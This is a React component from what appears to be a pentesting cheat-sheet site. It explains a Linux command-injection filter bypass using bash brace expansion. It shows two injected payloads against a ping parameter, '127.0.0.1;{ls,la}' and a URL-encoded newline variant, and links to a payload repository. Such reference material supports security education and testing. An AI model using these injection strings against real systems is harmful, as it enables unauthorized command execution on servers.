import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
import { lstat } from "fs";
  
  interface IProps {
    title: string;
  }
  
  const CI_Braces = ({ title }: IProps) => {

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
              <Typography>
              Command injection space filter bypass with bash brace expansion "&#123;ls,la&#125;" can be used ONLY on Linux. Brace expansion is a feature in shells like Bash that allows the user to generate multiple strings by specifying patterns inside curly braces. 
              </Typography>
              <Box pt={5}></Box>
              <SyntaxHighlighter className="syntax" language="bash">
              {'ping=127.0.0.1;{ls,la}'}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
              <SyntaxHighlighter className="syntax" language="bash">
              {'http://shelled.io?ping=127.0.0.1%0a{ls,la}'}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            </Typography>
            <Box pt={5}></Box>
            <TreeView
              aria-label="file system navigator"
              defaultCollapseIcon={<ExpandMoreIcon />}
              defaultExpandIcon={<ChevronRightIcon />}
              sx={{ height: "fit-content", flexGrow: 1, maxWidth: 400, overflowY: 'auto', color: '#000000' }}
            >
              <TreeItem nodeId="1" label="Resources">
              <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" target="_blank">
                  <TreeItem nodeId="2" label="PayloadAllTheThings" />
                </a>
                
              </TreeItem>
            </TreeView>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default CI_Braces;
  